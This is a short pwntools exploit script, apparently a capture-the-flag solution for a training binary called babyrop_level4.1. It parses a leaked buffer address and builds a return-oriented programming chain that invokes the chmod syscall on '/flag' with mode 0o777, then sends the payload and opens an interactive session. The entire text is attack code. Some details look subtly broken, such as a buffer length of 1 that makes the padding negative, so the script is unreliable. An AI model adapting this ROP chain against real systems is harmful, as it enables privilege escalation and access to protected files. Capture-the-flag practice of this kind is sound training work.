from pwn import *

context.arch = "amd64"

elf = ELF("/challenge/babyrop_level4.1")

io = elf.process()
io.recvuntil("[LEAK]")
buff_addr = p64(int(io.recvuntil(".").decode().split(": ")[1][:-1], 16))
buffer_len = 1
rop = ROP(elf)
rop.rax = p64(0x5a)
rop.rdi = buff_addr
rop.rsi = 0o777
rop.raw(rop.syscall)
PAYLOAD = b'/flag\x00' + b'A'*(buffer_len-len(b'/flag\x00')) + rop.chain()
with open("test.bin", "wb") as f:
    f.write(PAYLOAD)
io.send(PAYLOAD)

io.interactive()
